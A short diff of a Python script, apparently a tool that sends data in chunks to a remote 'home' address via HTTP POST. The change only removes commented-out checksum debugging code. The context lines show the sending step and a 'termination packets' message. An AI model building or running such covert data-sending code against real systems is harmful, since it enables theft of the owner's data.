@@ -75,17 +75,5 @@ def main():
 	requests.post(HOME_ADDR, data=json.dumps(payload), headers=HEADERS)
 	sys.stdout.write("[+] Sent termination packets and total of %s packets.\n" % current_chunk)
 
-# ########################################################################################
-#	string_check = ""
-#for i in chunks:
-#	string_check = string_check + i
-#
-#	cheky = zlib.crc32(string_check)
-#	print str(cheky) + ":" + str(checksum)
-#	print string_check + "\n" + IamDone
-#	if cheky == checksum:
-#		print "good!"
-#########################################################################################
-
 if __name__ == "__main__":
 	main()
